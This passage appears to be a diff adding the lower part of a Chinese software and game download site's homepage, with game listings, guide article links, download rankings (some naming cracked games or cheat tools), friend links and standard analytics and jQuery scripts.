+                        <div class="item-img"><img class="lazy" data-original="/uploads/allimg/200811/1_0Q11K4034920.jpg" alt="樱花校园模拟器1.035.23版本<span class='v_i'></span>"></div>
+                        <p class="item-title">樱花校园模拟器1.035.23版本<span class='v_i'></span></p>
+                        <p class="item-intro">樱花校园模拟器1.035.23版本是将会带你走向高中校园之中展开自己的冒险，游戏之中超多的服饰可以让你去进行挑选，前往不同的场景之中去进行冒险，各种的道具来制作出一场场的浪漫...</p>
+                        <p class="item-time">2020-08-11</p>
+                    </a>
+                </li>
+                <li class="goods-item">
+                    <a href="/plus/view.php?aid=10517" title="网易海岛纪元">
+                        <div class="item-img"><img class="lazy" data-original="https://img.qsw521.com/uploadimg/ico/2019/0906/1567739402311142.png" alt="网易海岛纪元"></div>
+                        <p class="item-title">网易海岛纪元</p>
+                        <p class="item-intro">游戏介绍《网易海岛纪元》游戏的画风还有质量内容的表现也都是属于上乘的，网易的制作还是非常的精美的，玩法上面也是有着高自由度的角色冒险内容，能够自由的建造创造非常丰...</p>
+                        <p class="item-time">2019-11-22</p>
+                    </a>
+                </li>
+                <li class="goods-item">
+                    <a href="/plus/view.php?aid=31123" title="少年三国志：零无限元宝破解版">
+                        <div class="item-img"><img class="lazy" data-original="https://img.qsw521.com/uploadimg/ico/2020/0109/1578539329268253.png" alt="少年三国志：零无限元宝破解版"></div>
+                        <p class="item-title">少年三国志：零无限元宝破解版</p>
+                        <p class="item-intro">游戏介绍《少年三国志：零无限元宝破解版》无限元宝的破解能够让玩家更为轻松的获取到自己想要的武将，随心的构建搭配出自己的强大配置，在这个九州并起的宏伟游戏世界中自由...</p>
+                        <p class="item-time">2020-04-07</p>
+                    </a>
+                </li>
+
+
+
+            </ul>
+
+
+        </div>
+        <p class="get-more">
+            <a href="/plus/list.php?tid=1" class="for-more active fr">查看更多&gt;&gt;</a>
+            <a href="/plus/list.php?tid=17" class="for-more fr">查看更多&gt;&gt;</a>
+            <a href="/plus/list.php?tid=18" class="for-more fr">查看更多&gt;&gt;</a>
+
+        </p>
+    </section>
+
+
+
+
+    <!--热门专题-->
+    <section class="hot-topics" id="hot-topics" style="display:none;">
+        <h2 class="index-title hot">热门专题</h2>
+        <ul class="index_nav-wrapper clearfix">
+            <li class="nav-item active">电脑软件</li>
+            <li class="nav-item">安卓软件</li>
+            <li class="nav-item">安卓游戏</li>
+            <li class="nav-item">MAC软件</li>
+            <li class="nav-item">MAC游戏</li>
+        </ul>
+        <div class="views-wrapper">
+            <ul class="nav-view ht-view active clearfix">
+                <li class="item">
+                    <a href="">
+                        <div class="img-wrapper">
+                            <img class="lazy" data-original="">
+                        </div>
+                        <h3 class="caption common_ovh">高品质音乐播放器</h3>
+                    </a>
+                </li>
+            </ul>
+            <ul class="nav-view ht-view clearfix">
+            </ul>
+            <ul class="nav-view ht-view clearfix">
+            </ul>
+            <ul class="nav-view ht-view clearfix mac">
+            </ul>
+            <ul class="nav-view ht-view clearfix mac">
+            </ul>
+        </div>
+        <p class="get-more">
+            <a href="/z/pc_1.html" class="for-more active fr">查看更多&gt;&gt;</a>
+            <a href="/z/android_soft_1.html" class="for-more fr">查看更多&gt;&gt;</a>
+            <a href="/z/android_game_1.html" class="for-more fr">查看更多&gt;&gt;</a>
+            <a href="/z/mac_1.html" class="for-more fr">查看更多&gt;&gt;</a>
+            <a href="/z/mac_game_1.html" class="for-more fr">查看更多&gt;&gt;</a>
+        </p>
+    </section>
+
+
+    <!--热门文章-->
+    <section class="hot-articles" id="hot-articles">
+        <h2 class="index-title articles">热门文章</h2>
+        <ul class="ha-lists clearfix">
+
+            <li>
+                <a href="/yxgl/261267.html" title="幻世录1技能加点_幻世录1主角怎么加点？">
+                    <div class="img-wrapper">
+                        <img class="lazy" data-original="/uploads/allimg/201023/1_1023161642A62.jpg" alt="幻世录1技能加点_幻世录1主角怎么加点？">
+                        <i class="mask icon-eye"></i>
+                    </div>
+                    <div class="info-wrapper">
+                        <p class="title">幻世录1技能加点_幻世录1主角怎么加点？</p>
+                        <p class="time">2020-10-23</p>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="/yxgl/261266.html" title="暗黑破坏神2地图第一章节详情攻略">
+                    <div class="img-wrapper">
+                        <img class="lazy" data-original="/uploads/allimg/201023/1_1023160ZG309.jpg" alt="暗黑破坏神2地图第一章节详情攻略">
+                        <i class="mask icon-eye"></i>
+                    </div>
+                    <div class="info-wrapper">
+                        <p class="title">暗黑破坏神2地图第一章节详情攻略</p>
+                        <p class="time">2020-10-23</p>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="/yxgl/261265.html" title="明星志愿3甜蜜乐章夏以军全支线攻略">
+                    <div class="img-wrapper">
+                        <img class="lazy" data-original="/uploads/allimg/201023/1_102316031YR9.jpg" alt="明星志愿3甜蜜乐章夏以军全支线攻略">
+                        <i class="mask icon-eye"></i>
+                    </div>
+                    <div class="info-wrapper">
+                        <p class="title">明星志愿3甜蜜乐章夏以军全支线攻略</p>
+                        <p class="time">2020-10-23</p>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="/yxgl/261264.html" title="是特工就上一百层新手通关攻略及小技巧">
+                    <div class="img-wrapper">
+                        <img class="lazy" data-original="/uploads/allimg/201023/1_10231529343145.jpg" alt="是特工就上一百层新手通关攻略及小技巧">
+                        <i class="mask icon-eye"></i>
+                    </div>
+                    <div class="info-wrapper">
+                        <p class="title">是特工就上一百层新手通关攻略及小技巧</p>
+                        <p class="time">2020-10-23</p>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="/yxgl/261263.html" title="梦之旅2梦之瑰宝怎么快速解锁？">
+                    <div class="img-wrapper">
+                        <img class="lazy" data-original="/uploads/allimg/201023/1_10231510001D6.jpg" alt="梦之旅2梦之瑰宝怎么快速解锁？">
+                        <i class="mask icon-eye"></i>
+                    </div>
+                    <div class="info-wrapper">
+                        <p class="title">梦之旅2梦之瑰宝怎么快速解锁？</p>
+                        <p class="time">2020-10-23</p>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="/yxgl/261262.html" title="风云天下会怎么快速领悟排云掌?">
+                    <div class="img-wrapper">
+                        <img class="lazy" data-original="/uploads/allimg/201023/1_10231500462092.jpg" alt="风云天下会怎么快速领悟排云掌?">
+                        <i class="mask icon-eye"></i>
+                    </div>
+                    <div class="info-wrapper">
+                        <p class="title">风云天下会怎么快速领悟排云掌?</p>
+                        <p class="time">2020-10-23</p>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="/yxgl/261261.html" title="火炬之光2装备存档攻略教程">
+                    <div class="img-wrapper">
+                        <img class="lazy" data-original="/uploads/allimg/201023/1_102314504UY3.jpg" alt="火炬之光2装备存档攻略教程">
+                        <i class="mask icon-eye"></i>
+                    </div>
+                    <div class="info-wrapper">
+                        <p class="title">火炬之光2装备存档攻略教程</p>
+                        <p class="time">2020-10-23</p>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="/yxgl/261260.html" title="国王的恩赐传奇愤怒之灵怎么获得？">
+                    <div class="img-wrapper">
+                        <img class="lazy" data-original="/uploads/allimg/201023/1_1023142R35413.jpg" alt="国王的恩赐传奇愤怒之灵怎么获得？">
+                        <i class="mask icon-eye"></i>
+                    </div>
+                    <div class="info-wrapper">
+                        <p class="title">国王的恩赐传奇愤怒之灵怎么获得？</p>
+                        <p class="time">2020-10-23</p>
+                    </div>
+                </a>
+            </li>
+
+
+
+        </ul>
+        <p>
+            <a href="/plus/list.php?tid=26" class="for-more fr">查看更多&gt;&gt;</a>
+        </p>
+    </section>
+
+    <!--排行榜-->
+    <section class="ranks clearfix" id="ranks-rec">
+        <h2 class="index-title ranks">排行榜</h2>
+        <div class="rank-item fl">
+            <h2 class="title">软件下载排行榜</h2>
+            <ul>
+
+                <li>
+                    <a href="/plus/view.php?aid=249473" title="情感导师话术">
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/uploads/allimg/200829/1_0RZT532UI.jpg" alt="情感导师话术">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">情感导师话术</p>
+                            <i class="index">1</i>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=34032" title="米读小说免费版">
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="https://img.qsw521.com/uploadimg/ico/2019/0717/1563350728252806.png" alt="米读小说免费版">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">米读小说免费版</p>
+                            <i class="index">2</i>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=249746" title="高级爱聊先生">
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/uploads/allimg/200830/1_0S015152HV6.png" alt="高级爱聊先生">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">高级爱聊先生</p>
+                            <i class="index">3</i>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=234820" title="坦克世界盒子  官方版v1.7.5.2701">
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/images/defaultpic.gif" alt="坦克世界盒子  官方版v1.7.5.2701">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">坦克世界盒子  官方版v1.7.5.2701</p>
+                            <i class="index">4</i>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=234191" title="csol稀饭辅助最新版  v12.26">
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/images/defaultpic.gif" alt="csol稀饭辅助最新版  v12.26">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">csol稀饭辅助最新版  v12.26</p>
+                            <i class="index">5</i>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=237350" title="约战竞技场对战平台  最新版 v1.9.2">
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="http://img3.downza.cn/download/201907/161556-5d1f073ce1c34.jpg" alt="约战竞技场对战平台  最新版 v1.9.2">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">约战竞技场对战平台  最新版 v1.9.2</p>
+                            <i class="index">6</i>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=236048" title="火线魔盒  官方最新版v6.2.8.10">
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="http://img3.downza.cn/download/201805/183121-5b0e7d7957d46.jpg" alt="火线魔盒  官方最新版v6.2.8.10">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">火线魔盒  官方最新版v6.2.8.10</p>
+                            <i class="index">7</i>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=234387" title="vlan平台  官方版">
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/images/defaultpic.gif" alt="vlan平台  官方版">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">vlan平台  官方版</p>
+                            <i class="index">8</i>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=113568" title="云集APP">
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="https://img.qsw521.com/uploadimg/ico/2019/0507/1557192685140148.png" alt="云集APP">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">云集APP</p>
+                            <i class="index">9</i>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=235027" title="lol英雄联盟控电脑版  v12.2">
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/images/defaultpic.gif" alt="lol英雄联盟控电脑版  v12.2">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">lol英雄联盟控电脑版  v12.2</p>
+                            <i class="index">10</i>
+                        </div>
+                    </a>
+                </li>
+
+
+            </ul>
+        </div>
+
+
+        <div class="rank-item rank-il fr">
+            <h2 class="title">手机游戏下载排行</h2>
+            <ul>
+
+                <li>
+                    <a href="/plus/view.php?aid=239506" title="天天爱萌宠最新版<span class='v_i'></span>">
+                        <i class="index fl">1</i>
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/uploads/allimg/200811/1_0Q120133H507.png"  alt="天天爱萌宠最新版<span class='v_i'></span>">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">天天爱萌宠最新版<span class='v_i'></span></p>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=239887" title="愤怒的猪">
+                        <i class="index fl">2</i>
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/uploads/allimg/200811/1_0Q1203I213V.jpg"  alt="愤怒的猪">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">愤怒的猪</p>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=240012" title="虫虫特技冒险">
+                        <i class="index fl">3</i>
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/uploads/allimg/200811/1_0Q12045043637.png"  alt="虫虫特技冒险">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">虫虫特技冒险</p>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=240591" title="僵尸围城ios">
+                        <i class="index fl">4</i>
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/uploads/allimg/200811/1_0Q1211953A55.jpg"  alt="僵尸围城ios">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">僵尸围城ios</p>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=240125" title="领养小女孩">
+                        <i class="index fl">5</i>
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="/uploads/allimg/200811/1_0Q12051523207.png"  alt="领养小女孩">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">领养小女孩</p>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=9163" title="最后一个大侠手游单机版">
+                        <i class="index fl">6</i>
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="https://img.qsw521.com/uploadimg/ico/2019/0628/1561706497835423.jpg"  alt="最后一个大侠手游单机版">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">最后一个大侠手游单机版</p>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=9269" title="仙剑奇侠传九野">
+                        <i class="index fl">7</i>
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="https://img.qsw521.com/uploadimg/ico/2019/1106/1573018847476736.png"  alt="仙剑奇侠传九野">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">仙剑奇侠传九野</p>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=8986" title="剑灵：革命手机版">
+                        <i class="index fl">8</i>
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="https://img.qsw521.com/uploadimg/ico/2019/1029/1572336823740884.png"  alt="剑灵：革命手机版">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">剑灵：革命手机版</p>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=9000" title="剑灵：革命手游最新版">
+                        <i class="index fl">9</i>
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="https://img.qsw521.com/uploadimg/ico/2019/1029/1572336823740884.png"  alt="剑灵：革命手游最新版">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">剑灵：革命手游最新版</p>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="/plus/view.php?aid=9285" title="上古世纪手游单机版">
+                        <i class="index fl">10</i>
+                        <div class="item-left fl">
+                            <img class="lazy" data-original="https://img.qsw521.com/uploadimg/ico/2019/0807/1565163920751631.jpg"  alt="上古世纪手游单机版">
+                        </div>
+                        <div class="item-right">
+                            <p class="item-name common_ovh">上古世纪手游单机版</p>
+                        </div>
+                    </a>
+                </li>
+
+            </ul>
+        </div>
+    </section>
+    <!--侧边导航条-->
+    <div id="go-top" class="common_sidebar"></div>
+
+</main>
+<section class="fs-links">
+    <div class="fs-container">
+        <p class="fs-top">
+            <span class="title">友情链接</span>
+            <span class="fr">
+                <span>申请友情链接</span>
+                <span>同行业网站</span>
+                <span>联系方式：QQ 1536498305 </span>
+            </span>
+        </p>
+
+        <a href='https://www.qqjike.com/' target='_blank'>极客下载</a>
+
+        <a href='https://www.jiweixin168.com/' target='_blank'>微信手游</a>
+
+        <a href='http://www.greenxiazai.com/soft/' target='_blank'>绿色下载站</a>
+
+        <a href='http://www.00791.com/tengxun/' target='_blank'>腾讯手游</a>
+
+        <a href='http://choice-pro.com' target='_blank'>优品下载</a>
+
+        <a href='http://www.down28.cn' target='_blank'>28下载站</a>
+
+        <a href='https://www.shiyouhome.com' target='_blank'>h5手游</a>
+
+        <a href='http://www.tongjiky.com/' target='_blank'>手机游戏下载</a>
+
+        <a href='http://www.ledouwan.com' target='_blank'>乐豆玩软件</a>
+
+        <a href='http://dlbtn.com/sjxz/sjyx/' target='_blank'>手机游戏下载</a>
+
+        <a href='http://7uuuuuu.com/' target='_blank'>好玩的网络游戏</a>
+
+        <a href='http://www.hunanyouwei.com/' target='_blank'>免费软件下载</a>
+
+    </div>
+</section>
+
+
+
+<footer class="common_footer clearfix">
+    <div class="copyrights">
+        <img src="/style/picture/logo-footer.png" alt="">
+        <p>
+            <a href="/plus/list.php?tid=155#about">关于本站</a>
+            <a href="/plus/list.php?tid=155#copyright">版权声明</a>
+            <a href="/plus/list.php?tid=155#help">下载帮助</a>
+            <a href="/plus/list.php?tid=155#ad">广告合作</a>
+            <a href="/plus/list.php?tid=155#open">开放平台</a>
+            <a href="/plus/list.php?tid=155#call">联系我们</a>
+        </p>
+        <p class="copyright-words">本站为非盈利性个人网站，本站所有软件来自于互联网，版权属原著所有，若有需要请购买正版。如有侵权，敬请来信联系我们，我们立即删除</p>
+        <p> Copyright? 2017-2018 online services. All rights reserved. 豫ICP备18019146号</p>
+    </div>
+</footer>
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?3dc76cd332dabe1c502aa6ef2b2ca3e2";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+<script src="/style/js/jquery.min.js"></script>
+<script src="/style/js/common.js"></script>
+<script src="/style/js/swiper.min.js"></script>
+<script src="/style/js/jquery.lazyload.min.js"></script>
+<script src="/style/js/index.js"></script>
+
+
+</body>
+</html>
